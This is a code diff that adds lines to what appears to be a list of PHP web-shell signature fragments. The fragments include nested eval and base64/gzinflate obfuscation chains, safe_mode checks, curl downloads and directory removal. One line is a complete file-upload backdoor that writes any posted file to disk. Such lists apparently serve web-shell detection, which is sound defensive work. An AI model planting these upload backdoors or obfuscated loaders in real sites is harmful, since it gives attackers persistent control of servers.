@@ -10,12 +10,21 @@ eval(strrev(htmlspecialchars_decode(gzinflate(base64_decode(
 ;@eval(
 <?php error_reporting(0);ini_set("display_errors", 0);
 function perms($f) {
+if (X=="" | X==null ) {
 $p = fileperms($f);
 if (($p & 0xC000) == 0xC000) {
+if (($perms & 0xC000) == 0xC000) {
+$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "On" : "Off";
 <?php else :if (isset($_GET[\
 eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(
+eval(eval(eval(eval(eval(eval(eval(eval(eval(
+eval(eval(eval(eval(eval(eval(eval(eval(
+eval(eval(eval(eval(eval(eval(eval(
+eval(eval(eval(eval(eval(eval
 eval(eval(eval(eval(eval
+eval(eval(eval(eval
 eval(eval(eval
+eval(eval(
 @curl_setopt($ch, CURLOPT_FILE, $fp);
 eval("\x3f\76"
 rmdir("$frpath");
@@ -25,3 +34,11 @@ htmlentities($words[$word], ENT_COMPAT, $word_charset);
 CURLOPT_RETURNTRANSFER,true);curl_setopt(
 function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str)
 eval(htmlspecialchars_decode(base64_decode(urldecode(base64_decode(
+echo $a_.uhex($_GET[
+if(empty($args[1])) die(color(1,
+if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stripslashes($value);
+indexBase64[str.charCodeAt(i++)];
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') 
+;if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>
+
+
